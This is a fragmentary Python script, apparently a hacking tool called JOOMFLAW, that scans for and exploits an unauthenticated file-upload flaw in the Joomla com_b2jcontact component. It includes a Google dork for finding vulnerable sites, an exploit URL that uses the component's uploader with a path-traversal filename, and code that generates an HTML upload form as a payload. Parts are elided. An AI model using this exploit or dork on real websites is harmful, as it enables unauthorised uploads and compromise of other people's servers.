...
\t JOOMFLAW v1.0 beta
\t by Team Flaw57 (India)

\t Type: com_b2jcontact 

\t JOOMLA AUTOMATED VULN SCAN 
\t & PAYLOAD GENERATOR by FLAW_57
 
\t USAGE :
\t coder >> help
\t coder >> set url http://example.c
\t om/index.php?com_b2jcontact
\t coder >> run 
...
print "\033[1;31mDork :\033[1;39m inurl:''/index.php?option=com_b2jcontact'' \033[1;39m"
...
\t updated by Parad0x Team Flaw57 26/01/2019

\t Commands Description

\t\033[1;31m ======== ===========\033[1;39m
\t # Modified on date 24/01/2019 by \033[1;36m J0k3r J3rry \033[1;31m- \033[1;37m Team \033[1;33mG\033[1;32mH\033[1;31mT\033[1;37m
...
payload = "/index.php?option=com_b2jcontact&view=loader&type=uploader&owner=component&bid=1&id=138&Itemid=138&qqfile=/../../+halah"
        ...
        if not coder:
            ...
            if check2 != vu:
                ...
                if os.path.exists(flaw):
                    os.remove('payload/index.html')
                else:
                    os.mkdir('./payload', 0755 );#added
                ...
                expl.write('</form> \n')
                expl.write('</<center># Modified on date 24/01/2019 by J0k3r J3rry</body></html> \n')
                expl.close()
                print ''
